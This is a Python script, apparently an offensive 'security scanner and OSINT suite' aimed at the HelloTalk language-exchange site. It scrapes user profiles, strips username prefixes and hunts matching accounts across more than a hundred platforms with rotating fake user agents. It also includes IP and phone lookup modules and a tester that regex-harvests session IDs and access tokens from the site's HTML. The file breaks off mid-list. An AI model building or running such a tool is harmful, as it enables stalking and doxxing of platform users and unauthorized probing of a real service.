#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HELLOTALK PROFESSIONAL SECURITY SCANNER + OSINT SUITE
Complete profile extraction + Security Testing + IP/Username Hunting
Version: 2.0 Ultimate | Author: SYLHETYHACKVENGER (THE-ERROR808)
"""

import sys
import os
import re
import json
import csv
import time
import random
import logging
import hashlib
import warnings
import base64
import binascii
import socket
import ssl
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

# Third-party imports
try:
    import requests
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    from colorama import init, Fore, Back, Style
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone
except ImportError as e:
    print(f"Error: Missing required module. Please install: pip install requests beautifulsoup4 fake-useragent colorama phonenumbers")
    sys.exit(1)

# Suppress SSL warnings
try:
    from urllib3.exceptions import InsecureRequestWarning
    warnings.filterwarnings('ignore', category=InsecureRequestWarning)
except ImportError:
    pass

# Initialize colorama
init(autoreset=True)

# ============================================================================
# 🎨 COLOR CONFIGURATION
# ============================================================================

class Colors:
    """Terminal color configuration"""
    HEADER = Fore.CYAN + Style.BRIGHT
    SUCCESS = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    ERROR = Fore.RED + Style.BRIGHT
    INFO = Fore.BLUE + Style.BRIGHT
    HIGHLIGHT = Fore.MAGENTA + Style.BRIGHT
    DIM = Fore.WHITE + Style.DIM
    BOLD = Style.BRIGHT
    RESET = Style.RESET_ALL
    LANGUAGE = Fore.BLUE + Style.BRIGHT
    LOCATION = Fore.YELLOW + Style.BRIGHT
    STATS = Fore.CYAN + Style.BRIGHT
    SOCIAL = Fore.MAGENTA + Style.BRIGHT
    TIME = Fore.YELLOW + Style.BRIGHT
    PROFILE = Fore.MAGENTA + Style.BRIGHT
    EXPORT = Fore.GREEN + Style.BRIGHT
    ROCKET = Fore.RED + "🚀"
    STAR = Fore.YELLOW + "⭐"
    FIRE = Fore.RED + "🔥"
    SHIELD = Fore.BLUE + "🛡️"
    BUG = Fore.RED + "🐛"
    KEY = Fore.YELLOW + "🔑"
    LOCK = Fore.RED + "🔒"
    UNLOCK = Fore.GREEN + "🔓"
    SCAN = Fore.CYAN + "🔍"
    TARGET = Fore.RED + "🎯"
    SCANNER = Fore.CYAN + "🔍"
    CVE = Fore.RED + "⚠️"
    VERBOSE = Fore.YELLOW + "📝"
    RAW = Fore.MAGENTA + "📄"
    AUTH = Fore.YELLOW + "🔐"
    API = Fore.CYAN + "🌐"
    STORAGE = Fore.MAGENTA + "💾"
    INJECTION = Fore.RED + "💉"
    OSINT = Fore.CYAN + "🕵️"

# ============================================================================
# 📊 DATA MODELS
# ============================================================================

@dataclass
class ProfileStats:
    """Profile statistics container"""
    followers: int = 0
    following: int = 0
    posts: int = 0
    moments: int = 0
    community_feedback: int = 0
    language_exchange: int = 0
    partner_support: int = 0
    learning_consistency: int = 0
    active_days: int = 0
    weekly_hours: int = 0
    streak_days: int = 0
    avg_rating: float = 0.0
    users_helped: int = 0
    conversations: int = 0
    level: int = 0
    learning_progress: int = 0

@dataclass
class SecurityFinding:
    category: str
    severity: str
    title: str
    description: str
    evidence: str
    remediation: str
    cvss_score: float = 0.0
    cwe_id: str = ""

@dataclass
class AuthenticationFlaw:
    flaw_type: str
    severity: str
    description: str
    evidence: str
    remediation: str

@dataclass
class APIExploitation:
    endpoint: str
    vulnerability_type: str
    severity: str
    exposed_data: List[str]
    evidence: str
    remediation: str

@dataclass
class InsecureStorage:
    storage_type: str
    severity: str
    exposed_data: List[str]
    evidence: str
    remediation: str

@dataclass
class ServerSideInjection:
    injection_type: str
    severity: str
    parameter: str
    payload: str
    evidence: str
    remediation: str

@dataclass
class SecurityTestResults:
    authentication_flaws: List[AuthenticationFlaw] = field(default_factory=list)
    api_exploitations: List[APIExploitation] = field(default_factory=list)
    insecure_storage: List[InsecureStorage] = field(default_factory=list)
    server_side_injections: List[ServerSideInjection] = field(default_factory=list)
    security_findings: List[SecurityFinding] = field(default_factory=list)
    cvss_scores: Dict[str, float] = field(default_factory=dict)
    overall_risk: str = "LOW"
    scan_timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    verbose_output: List[str] = field(default_factory=list)

@dataclass
class CVE202025900TestResult:
    is_vulnerable: bool = False
    confidence_score: float = 0.0
    vulnerable_endpoints: List[Dict] = field(default_factory=list)
    evidence: List[str] = field(default_factory=list)
    test_details: Dict = field(default_factory=dict)
    raw_responses: Dict = field(default_factory=dict)
    verbose_output: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    scan_timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class SocialMediaPresence:
    platform: str
    url: str
    status: str
    profile_data: Dict = field(default_factory=dict)

@dataclass
class HelloTalkProfile:
    username: str
    profile_url: str
    scraped_at: str = field(default_factory=lambda: datetime.now().isoformat())
    name: Optional[str] = None
    bio: Optional[str] = None
    location: Optional[str] = None
    country: Optional[str] = None
    city: Optional[str] = None
    native_language: List[str] = field(default_factory=list)
    learning_language: List[str] = field(default_factory=list)
    learning_level: Optional[str] = None
    interests: List[str] = field(default_factory=list)
    profession: Optional[str] = None
    is_verified: bool = False
    is_premium: bool = False
    stats: ProfileStats = field(default_factory=ProfileStats)
    cve_test_result: CVE202025900TestResult = field(default_factory=CVE202025900TestResult)
    security_test_results: SecurityTestResults = field(default_factory=SecurityTestResults)
    social_media_presence: List[SocialMediaPresence] = field(default_factory=list)
    fetch_status: str = 'pending'
    data_completeness: str = '0/15'
    raw_html: str = ''
    raw_html_hash: str = ''
    response_size: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            'username': self.username,
            'profile_url': self.profile_url,
            'scraped_at': self.scraped_at,
            'name': self.name,
            'bio': self.bio,
            'location': self.location,
            'country': self.country,
            'city': self.city,
            'native_language': self.native_language,
            'learning_language': self.learning_language,
            'learning_level': self.learning_level,
            'interests': self.interests,
            'profession': self.profession,
            'is_verified': self.is_verified,
            'is_premium': self.is_premium,
            'stats': asdict(self.stats) if self.stats else {},
            'security': {
                'cve_2020_25900': {
                    'is_vulnerable': self.cve_test_result.is_vulnerable,
                    'confidence_score': self.cve_test_result.confidence_score,
                    'vulnerable_endpoints': self.cve_test_result.vulnerable_endpoints,
                    'evidence': self.cve_test_result.evidence
                },
                'authentication_flaws': [
                    {
                        'type': f.flaw_type,
                        'severity': f.severity,
                        'description': f.description,
                        'evidence': f.evidence,
                        'remediation': f.remediation
                    } for f in self.security_test_results.authentication_flaws
                ],
                'api_exploitations': [
                    {
                        'endpoint': a.endpoint,
                        'vulnerability_type': a.vulnerability_type,
                        'severity': a.severity,
                        'exposed_data': a.exposed_data,
                        'evidence': a.evidence,
                        'remediation': a.remediation
                    } for a in self.security_test_results.api_exploitations
                ],
                'insecure_storage': [
                    {
                        'storage_type': s.storage_type,
                        'severity': s.severity,
                        'exposed_data': s.exposed_data,
                        'evidence': s.evidence,
                        'remediation': s.remediation
                    } for s in self.security_test_results.insecure_storage
                ],
                'server_side_injections': [
                    {
                        'injection_type': i.injection_type,
                        'severity': i.severity,
                        'parameter': i.parameter,
                        'payload': i.payload,
                        'evidence': i.evidence,
                        'remediation': i.remediation
                    } for i in self.security_test_results.server_side_injections
                ],
                'overall_risk': self.security_test_results.overall_risk,
                'scan_timestamp': self.security_test_results.scan_timestamp
            },
            'social_media': [
                {
                    'platform': s.platform,
                    'url': s.url,
                    'status': s.status,
                    'profile_data': s.profile_data
                } for s in self.social_media_presence
            ],
            'fetch_status': self.fetch_status,
            'data_completeness': self.data_completeness,
            'raw_html_hash': self.raw_html_hash,
            'response_size': self.response_size
        }

# ============================================================================
# 🛠️ USERNAME CLEANER
# ============================================================================

class UsernameCleaner:
    """Clean and extract usernames from HelloTalk profiles"""
    
    @staticmethod
    def clean_hellotalk_username(raw_username: str) -> str:
        """
        Clean HelloTalk username by removing prefixes like:
        cv_, cd_, we_, ht_, xx_ (2 letters + underscore)
        Also handles patterns like xx-username
        """
        if not raw_username:
            return raw_username
        
        # Remove common prefixes: xx_ (2 letters + underscore)
        cleaned = re.sub(r'^[a-zA-Z]{2}_', '', raw_username)
        
        # Remove patterns like xx- (2 letters + dash)
        cleaned = re.sub(r'^[a-zA-Z]{2}-', '', cleaned)
        
        # Remove numeric prefixes like 01_, 02_ etc
        cleaned = re.sub(r'^[0-9]{1,2}_', '', cleaned)
        
        # If still has prefix, try to extract the meaningful part
        if '_' in cleaned and len(cleaned.split('_')) > 1:
            parts = cleaned.split('_')
            cleaned = max(parts, key=len) if parts else cleaned
        
        return cleaned.strip()
    
    @staticmethod
    def extract_username_from_url(url: str) -> str:
        """Extract username from HelloTalk profile URL"""
        match = re.search(r'/en/partners/([^/?]+)', url)
        if match:
            return match.group(1)
        return None
    
    @staticmethod
    def generate_search_variants(username: str) -> List[str]:
        """Generate search variants for social media hunting"""
        variants = [username]
        
        prefixes = ['', 'real', 'official', 'the', 'iam', 'im']
        for prefix in prefixes:
            if prefix:
                variants.append(f"{prefix}{username}")
                variants.append(f"{prefix}_{username}")
                variants.append(f"{prefix}-{username}")
        
        suffixes = ['', 'official', 'real', 'live', 'world']
        for suffix in suffixes:
            if suffix:
                variants.append(f"{username}{suffix}")
                variants.append(f"{username}_{suffix}")
                variants.append(f"{username}-{suffix}")
        
        return list(set(variants))

# ============================================================================
# 🛠️ IP TRACKER
# ============================================================================

class IPTracker:
    """IP address tracking and intelligence module"""
    
    @staticmethod
    def get_my_ip() -> str:
        try:
            response = requests.get('https://api.ipify.org/', timeout=5)
            return response.text
        except:
            return "Unable to retrieve"
    
    @staticmethod
    def track_ip(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ipwho.is/{ip}", timeout=10)
            return json.loads(response.text)
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def format_ip_info(ip_data: Dict) -> str:
        if 'error' in ip_data:
            return f"{Colors.ERROR}❌ Error: {ip_data['error']}"
        
        info = []
        info.append(f"{Colors.HEADER}{'═'*60}")
        info.append(f"{Colors.SCANNER} 🌐 IP INTELLIGENCE REPORT")
        info.append(f"{Colors.HEADER}{'═'*60}")
        
        ip = ip_data.get('ip', 'N/A')
        info.append(f"{Colors.INFO} 📡 IP Address: {Colors.HIGHLIGHT}{ip}")
        info.append(f"{Colors.INFO} 📍 Country: {Colors.HIGHLIGHT}{ip_data.get('country', 'N/A')}")
        info.append(f"{Colors.INFO} 🏙️ City: {Colors.HIGHLIGHT}{ip_data.get('city', 'N/A')}")
        info.append(f"{Colors.INFO} 🌍 Continent: {Colors.HIGHLIGHT}{ip_data.get('continent', 'N/A')}")
        info.append(f"{Colors.INFO} 📌 Region: {Colors.HIGHLIGHT}{ip_data.get('region', 'N/A')}")
        
        lat = ip_data.get('latitude')
        lon = ip_data.get('longitude')
        if lat and lon:
            info.append(f"{Colors.INFO} 📍 Coordinates: {Colors.HIGHLIGHT}{lat}, {lon}")
            info.append(f"{Colors.INFO} 🗺️ Maps Link: {Colors.DIM}https://www.google.com/maps/@{lat},{lon},8z")
        
        info.append(f"{Colors.INFO} 📞 Calling Code: {Colors.HIGHLIGHT}{ip_data.get('calling_code', 'N/A')}")
        info.append(f"{Colors.INFO} 🌐 ISP: {Colors.HIGHLIGHT}{ip_data.get('connection', {}).get('isp', 'N/A')}")
        info.append(f"{Colors.INFO} 🏢 Organization: {Colors.HIGHLIGHT}{ip_data.get('connection', {}).get('org', 'N/A')}")
        info.append(f"{Colors.INFO} 🔢 ASN: {Colors.HIGHLIGHT}{ip_data.get('connection', {}).get('asn', 'N/A')}")
        info.append(f"{Colors.INFO} 🕐 Timezone: {Colors.HIGHLIGHT}{ip_data.get('timezone', {}).get('id', 'N/A')}")
        info.append(f"{Colors.INFO} ⏰ Current Time: {Colors.HIGHLIGHT}{ip_data.get('timezone', {}).get('current_time', 'N/A')}")
        
        info.append(f"{Colors.HEADER}{'═'*60}")
        return '\n'.join(info)

# ============================================================================
# 🛠️ PHONE TRACKER
# ============================================================================

class PhoneTracker:
    """Phone number tracking and intelligence module"""
    
    @staticmethod
    def track_phone(phone_number: str, default_region: str = "ID") -> Dict:
        try:
            parsed = phonenumbers.parse(phone_number, default_region)
            return {
                'valid': phonenumbers.is_valid_number(parsed),
                'possible': phonenumbers.is_possible_number(parsed),
                'location': geocoder.description_for_number(parsed, "en") or "Unknown",
                'carrier': carrier.name_for_number(parsed, "en") or "Unknown",
                'region_code': phonenumbers.region_code_for_number(parsed),
                'timezone': ', '.join(timezone.time_zones_for_number(parsed)) or "Unknown",
                'international': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                'e164': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164),
                'country_code': parsed.country_code,
                'national_number': parsed.national_number,
                'number_type': PhoneTracker._get_number_type(parsed)
            }
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def _get_number_type(parsed):
        type_map = {
            phonenumbers.PhoneNumberType.MOBILE: "Mobile",
            phonenumbers.PhoneNumberType.FIXED_LINE: "Fixed Line",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed/Mobile",
            phonenumbers.PhoneNumberType.TOLL_FREE: "Toll Free",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "Premium Rate",
            phonenumbers.PhoneNumberType.SHARED_COST: "Shared Cost",
            phonenumbers.PhoneNumberType.VOIP: "VoIP",
            phonenumbers.PhoneNumberType.PERSONAL_NUMBER: "Personal",
            phonenumbers.PhoneNumberType.PAGER: "Pager",
            phonenumbers.PhoneNumberType.UAN: "UAN",
            phonenumbers.PhoneNumberType.VOICEMAIL: "Voicemail",
            phonenumbers.PhoneNumberType.UNKNOWN: "Unknown"
        }
        return type_map.get(phonenumbers.number_type(parsed), "Unknown")
    
    @staticmethod
    def format_phone_info(phone_data: Dict) -> str:
        if 'error' in phone_data:
            return f"{Colors.ERROR}❌ Error: {phone_data['error']}"
        
        info = []
        info.append(f"{Colors.HEADER}{'═'*60}")
        info.append(f"{Colors.SCANNER} 📱 PHONE NUMBER INTELLIGENCE")
        info.append(f"{Colors.HEADER}{'═'*60}")
        
        info.append(f"{Colors.INFO} 📞 Number: {Colors.HIGHLIGHT}{phone_data.get('international', 'N/A')}")
        info.append(f"{Colors.INFO} ✅ Valid: {Colors.HIGHLIGHT}{'Yes' if phone_data.get('valid') else 'No'}")
        info.append(f"{Colors.INFO} 📍 Location: {Colors.HIGHLIGHT}{phone_data.get('location', 'N/A')}")
        info.append(f"{Colors.INFO} 📡 Carrier: {Colors.HIGHLIGHT}{phone_data.get('carrier', 'N/A')}")
        info.append(f"{Colors.INFO} 🌍 Region: {Colors.HIGHLIGHT}{phone_data.get('region_code', 'N/A')}")
        info.append(f"{Colors.INFO} 🕐 Timezone: {Colors.HIGHLIGHT}{phone_data.get('timezone', 'N/A')}")
        info.append(f"{Colors.INFO} 📝 Type: {Colors.HIGHLIGHT}{phone_data.get('number_type', 'N/A')}")
        info.append(f"{Colors.INFO} 🔢 Country Code: {Colors.HIGHLIGHT}+{phone_data.get('country_code', 'N/A')}")
        
        info.append(f"{Colors.HEADER}{'═'*60}")
        return '\n'.join(info)

# ============================================================================
# 🛠️ USERNAME HUNTER
# ============================================================================

class UsernameHunter:
    """Multi-platform username hunter with automatic username cleaning"""
    
    def __init__(self, auto_clean: bool = True):
        self.session = requests.Session()
        self.ua = UserAgent()
        self.auto_clean = auto_clean
        self.cleaner = UsernameCleaner()
        self._update_headers()
        
        self.platforms = [
        {"url": "https://www.facebook.com/{}", "name": "Facebook"},
        {"url": "https://www.instagram.com/{}", "name": "Instagram"},
        {"url": "https://www.twitter.com/{}", "name": "Twitter/X"},
        {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
        {"url": "https://github.com/{}", "name": "GitHub"},
        {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
        {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
        {"url": "https://www.youtube.com/@{}", "name": "YouTube"},
        {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
        {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
        {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
        {"url": "https://www.behance.net/{}", "name": "Behance"},
        {"url": "https://medium.com/@{}", "name": "Medium"},
        {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
        {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
        {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
        {"url": "https://vimeo.com/{}", "name": "Vimeo"},
        {"url": "https://www.deviantart.com/{}", "name": "DeviantArt"},
        {"url": "https://www.patreon.com/{}", "name": "Patreon"},
        {"url": "https://steamcommunity.com/id/{}", "name": "Steam"},
        {"url": "https://www.roblox.com/users/{}", "name": "Roblox"},
        {"url": "https://news.ycombinator.com/user?id={}", "name": "Hacker News"},
        {"url": "https://www.goodreads.com/{}", "name": "Goodreads"},
        {"url": "https://letterboxd.com/{}", "name": "Letterboxd"},
        {"url": "https://myanimelist.net/profile/{}", "name": "MyAnimeList"},
        {"url": "https://www.last.fm/user/{}", "name": "Last.fm"},
        {"url": "https://www.mixcloud.com/{}", "name": "Mixcloud"},
        {"url": "https://www.discogs.com/user/{}", "name": "Discogs"},
        {"url": "https://www.ello.co/{}", "name": "Ello"},
        {"url": "https://www.weheartit.com/{}", "name": "We Heart It"},
        {"url": "https://www.threads.net/@{}", "name": "Threads"},

        # ---- TRADING / FINANCE (30+) ----
        {"url": "https://www.tradingview.com/u/{}", "name": "TradingView"},
        {"url": "https://www.etoro.com/people/{}", "name": "eToro"},
        {"url": "https://www.zulutrade.com/trader/{}", "name": "ZuluTrade"},
        {"url": "https://www.myfxbook.com/members/{}", "name": "Myfxbook"},
        {"url": "https://www.forexfactory.com/{}", "name": "ForexFactory"},
        {"url": "https://www.robinhood.com/people/{}", "name": "Robinhood (if enabled)"},
        {"url": "https://www.webull.com/profile/{}", "name": "Webull"},
        {"url": "https://www.fiverr.com/{}", "name": "Fiverr (freelance)"},
        {"url": "https://www.upwork.com/freelancers/~{}", "name": "Upwork"},
        {"url": "https://www.freelancer.com/u/{}", "name": "Freelancer"},
        {"url": "https://www.guru.com/freelancers/{}", "name": "Guru"},
        {"url": "https://www.peopleperhour.com/freelancer/{}", "name": "PeoplePerHour"},
        {"url": "https://www.99designs.com/profiles/{}", "name": "99designs"},
        {"url": "https://www.designcrowd.com/designer/{}", "name": "DesignCrowd"},
        {"url": "https://www.toptal.com/resume/{}", "name": "Toptal"},
        {"url": "https://contently.com/{}", "name": "Contently"},
        {"url": "https://workingnotworking.com/{}", "name": "Working Not Working"},
        {"url": "https://www.servicescape.com/freelancers/{}", "name": "ServiceScape"},
        {"url": "https://www.bark.com/en/us/profile/{}", "name": "Bark"},
        {"url": "https://www.thumbtack.com/{}", "name": "Thumbtack"},
        {"url": "https://hubstafftalent.com/freelancer/{}", "name": "Hubstaff Talent"},
        {"url": "https://www.skyword.com/author/{}", "name": "Skyword"},
        {"url": "https://www.authenticjobs.com/{}", "name": "Authentic Jobs"},

        # ---- LANGUAGE LEARNING (20+) ----
        {"url": "https://www.duolingo.com/profile/{}", "name": "Duolingo"},
        {"url": "https://www.memrise.com/user/{}", "name": "Memrise"},
        {"url": "https://www.busuu.com/{}", "name": "Busuu"},
        {"url": "https://www.italki.com/user/{}", "name": "italki"},
        {"url": "https://www.tandem.net/profile/{}", "name": "Tandem"},
        {"url": "https://www.hellotalk.com/profile/{}", "name": "HelloTalk"},
        {"url": "https://www.lingq.com/profile/{}", "name": "LingQ"},
        {"url": "https://www.clozemaster.com/users/{}", "name": "Clozemaster"},
        {"url": "https://preply.com/en/tutor/{}", "name": "Preply"},
        {"url": "https://www.verbling.com/teachers/{}", "name": "Verbling"},
        {"url": "https://www.wyzant.com/tutors/{}", "name": "Wyzant"},
        {"url": "https://www.superprof.com/{}", "name": "Superprof"},
        {"url": "https://takelessons.com/profile/{}", "name": "TakeLessons"},
        {"url": "https://lingbe.com/profile/{}", "name": "Lingbe"},
        {"url": "https://speaky.com/profile/{}", "name": "Speaky"},
        {"url": "https://polyglotclub.com/member/{}", "name": "Polyglot Club"},
        {"url": "https://lang-8.com/{}", "name": "Lang-8"},
        {"url": "https://hinative.com/en-US/users/{}", "name": "HiNative"},
        {"url": "https://www.lingodeer.com/user/{}", "name": "Lingodeer"},
        {"url": "https://www.mangolanguages.com/profile/{}", "name": "Mango Languages"},

        # ---- CYBERSECURITY / HACKING PLATFORMS ----
        {"url": "https://www.hackerrank.com/{}", "name": "HackerRank"},
        {"url": "https://leetcode.com/{}", "name": "LeetCode"},
        {"url": "https://www.codewars.com/users/{}", "name": "CodeWars"},
        {"url": "https://tryhackme.com/p/{}", "name": "TryHackMe"},
        {"url": "https://app.hackthebox.com/profile/{}", "name": "HackTheBox"},
        {"url": "https://hackerone.com/{}", "name": "HackerOne"},
        {"url": "https://bugcrowd.com/{}", "name": "Bugcrowd"},
        {"url": "https://intigriti.com/profiles/{}", "name": "Intigriti"},
        {"url": "https://0x00sec.org/u/{}", "name": "0x00sec"},
        {"url": "https://ctftime.org/user/{}", "name": "CTFtime"},
        {"url": "https://www.openbugbounty.org/researchers/{}", "name": "Open Bug Bounty"},
        {"url": "https://yeswehack.com/hunter/{}", "name": "YesWeHack"},
        {"url": "https://cyberdefenders.org/profile/{}", "name": "CyberDefenders"},
    

    # Also add some blogging / news platforms (journals)
    
        {"url": "https://{}.blogspot.com", "name": "Blogger"},
        {"url": "https://{}.wordpress.com", "name": "WordPress"},
        {"url": "https://substack.com/@{}", "name": "Substack"},
        {"url": "https://medium.com/@{}", "name": "Medium (already)"},  # already included
        {"url": "https://hashnode.com/@{}", "name": "Hashnode"},
        {"url": "https://dev.to/{}", "name": "DEV Community"},
    ]
        
        seen = set()
        unique_platforms = []
        for p in self.platforms:
            key = p['url']
            if key not in seen:
                seen.add(key)
                unique_platforms.append(p)
        self.platforms = unique_platforms
    
    def _update_headers(self):
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
    
    def check_platform(self, platform: Dict, username: str) -> SocialMediaPresence:
        url = platform['url'].format(username)
        
        try:
            self._update_headers()
            response = self.session.get(url, timeout=5, allow_redirects=False)
            
            if response.status_code == 200:
                text = response.text.lower()
                not_found_phrases = [
                    "not found", "page not found", "doesn't exist",
                    "sorry, we couldn't find", "profile not found",
                    "no such user", "user not found", "couldn't find",
                    "this user doesn't exist", "user does not exist",
                    "account not found", "profile unavailable"
                ]
                
                if any(phrase in text for phrase in not_found_phrases):
                    return SocialMediaPresence(
                        platform=platform['name'],
                        url=url,
                        status='not_found',
                        profile_data={}
                    )
                else:
                    profile_data = {'status_code': 200, 'url': url}
                    try:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        title = soup.find('title')
                        if title:
                            profile_data['title'] = title.get_text(strip=True)[:100]
                    except:
                        pass
                    
                    return SocialMediaPresence(
                        platform=platform['name'],
                        url=url,
                        status='found',
                        profile_data=profile_data
                    )
                    
            elif response.status_code in [301, 302, 303, 307, 308]:
                return SocialMediaPresence(
                    platform=platform['name'],
                    url=url,
                    status='found',
                    profile_data={'redirect_to': response.headers.get('Location', '')}
                )
            elif response.status_code == 404:
                return SocialMediaPresence(
                    platform=platform['name'],
                    url=url,
                    status='not_found',
                    profile_data={}
                )
            else:
                return SocialMediaPresence(
                    platform=platform['name'],
                    url=url,
                    status='error',
                    profile_data={'status_code': response.status_code}
                )
                
        except requests.Timeout:
            return SocialMediaPresence(
                platform=platform['name'],
                url=url,
                status='error',
                profile_data={'error': 'timeout'}
            )
        except Exception as e:
            return SocialMediaPresence(
                platform=platform['name'],
                url=url,
                status='error',
                profile_data={'error': str(e)}
            )
    
    def hunt(self, username: str, max_workers: int = 20) -> List[SocialMediaPresence]:
        print(f"\n{Colors.OSINT} 🕵️ Social Media Hunting")
        print(f"{Colors.HEADER}{'─'*60}")
        
        original_username = username
        if self.auto_clean:
            cleaned = self.cleaner.clean_hellotalk_username(username)
            print(f"{Colors.DIM}  📝 Original: {original_username}")
            print(f"{Colors.INFO}  📝 Cleaned: {cleaned}")
            username = cleaned
        
        variants = self.cleaner.generate_search_variants(username)
        print(f"{Colors.INFO}  🔍 Testing {len(variants)} username variants...")
        
        all_results = []
        total_platforms = len(self.platforms)
        
        print(f"{Colors.SCAN}  📡 Scanning {total_platforms} platforms for '{username}'...")
        
        completed = 0
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_platform = {
                executor.submit(self.check_platform, platform, username): platform 
                for platform in self.platforms
            }
            
            for future in as_completed(future_to_platform):
                result = future.result()
                all_results.append(result)
                completed += 1
                
                status_icon = "✅" if result.status == 'found' else "❌" if result.status == 'not_found' else "⚠️"
                sys.stdout.write(f"\r{Colors.DIM}[{completed}/{total_platforms}] {status_icon} {result.platform:<20}{Colors.RESET}")
                sys.stdout.flush()
        
        print()
        all_results.sort(key=lambda x: (0 if x.status == 'found' else 1 if x.status == 'error' else 2))
        
        return all_results
    
    def format_hunt_results(self, results: List[SocialMediaPresence]) -> str:
        found = [r for r in results if r.status == 'found']
        errors = [r for r in results if r.status == 'error']
        not_found = [r for r in results if r.status == 'not_found']
        
        output = []
        output.append(f"{Colors.HEADER}{'═'*60}")
        output.append(f"{Colors.OSINT} 🕵️ SOCIAL MEDIA HUNT RESULTS")
        output.append(f"{Colors.HEADER}{'═'*60}")
        output.append(f"{Colors.SUCCESS} ✅ Found: {len(found)}")
        output.append(f"{Colors.WARNING} ⚠️ Errors: {len(errors)}")
        output.append(f"{Colors.DIM} ❌ Not Found: {len(not_found)}")
        
        if found:
            output.append(f"\n{Colors.SUCCESS}{'─'*60}")
            output.append(f"{Colors.SUCCESS} 📍 FOUND PROFILES")
            output.append(f"{Colors.SUCCESS}{'─'*60}")
            for r in found:
                output.append(f"{Colors.SUCCESS}  ✅ {r.platform}: {Colors.DIM}{r.url}")
        
        if errors:
            output.append(f"\n{Colors.WARNING}{'─'*60}")
            output.append(f"{Colors.WARNING} ⚠️ ERRORS")
            output.append(f"{Colors.WARNING}{'─'*60}")
            for r in errors:
                output.append(f"{Colors.WARNING}  ⚠️ {r.platform}: {Colors.DIM}{r.url}")
        
        output.append(f"{Colors.HEADER}{'═'*60}")
        return '\n'.join(output)

# ============================================================================
# 🛠️ ADVANCED SECURITY TESTER
# ============================================================================

class AdvancedSecurityTester:
    def __init__(self):
        self.base_url = "https://www.hellotalk.com"
        self.api_base = f"{self.base_url}/api"
        self.session = requests.Session()
        self.ua = UserAgent()
        self.verbose_output = []
        self.results = SecurityTestResults()
        self._update_headers()
    
    def _update_headers(self):
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Referer': self.base_url,
            'X-Requested-With': 'XMLHttpRequest'
        })
    
    def _log_verbose(self, message: str, color: str = Colors.INFO):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        log_entry = f"[{timestamp}] {message}"
        self.verbose_output.append(log_entry)
        self.results.verbose_output.append(log_entry)
        print(f"{color}{log_entry}{Colors.RESET}")
    
    def run_comprehensive_security_test(self, username: str, raw_html: str = None) -> SecurityTestResults:
        self.results = SecurityTestResults()
        self.results.scan_timestamp = datetime.now().isoformat()
        
        print(f"\n{Colors.HEADER}{'═'*80}")
        print(f"{Colors.SHIELD} 🛡️ COMPREHENSIVE SECURITY TEST")
        print(f"{Colors.HEADER}{'═'*80}")
        print(f"{Colors.INFO} 📋 Target: {Colors.HIGHLIGHT}@{username}")
        print(f"{Colors.TIME} 🕐 Started: {Colors.HIGHLIGHT}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Colors.HEADER}{'─'*80}")
        
        self._test_authentication_flaws(username, raw_html)
        self._test_api_exploitation(username, raw_html)
        self._test_insecure_storage(username, raw_html)
        self._test_server_side_injection(username, raw_html)
        self._calculate_overall_risk()
        self._print_security_summary()
        
        return self.results
    
    def _test_authentication_flaws(self, username: str, raw_html: str = None):
        print(f"\n{Colors.AUTH} 🔐 TESTING AUTHENTICATION FLAWS")
        print(f"{Colors.HEADER}{'─'*60}")
        
        self._log_verbose("Checking for session information exposure...", Colors.AUTH)
        if raw_html:
            session_patterns = [
                r'session[_-]?id[=:][^&\s"\']+',
                r'SESS[_-]?ID[=:][^&\s"\']+',
                r'PHPSESSID[=:][^&\s"\']+',
                r'JSESSIONID[=:][^&\s"\']+',
                r'token[=:][a-zA-Z0-9._-]+',
                r'access_token[=:][a-zA-Z0-9._-]+',
                r'auth_token[=:][a-zA-Z0-9._-]+'
            ]
            
            for pattern in session_patterns:
                matches = re.findall(pattern, raw_html, re.IGNORECASE)
                if matches:
                    self.results.authentication_flaws.append(AuthenticationFlaw(
                        flaw_type='credential_exposure',
                        severity='MEDIUM',
                        description=f"Session tokens exposed in HTML: {', '.join(matches[:3])}",
                        evidence=f"Found {len(matches)} session token references",
                        remediation="Remove session tokens from client-side code. Use secure HTTP-only cookies."
                    ))
                    self._log_verbose(f"⚠️ Found exposed session tokens: {', '.join(matches[:3])}", Colors.WARNING)
        
        self._log_verbose("Checking for weak authentication patterns...", Colors.AUTH)
        weak_auth_patterns = [
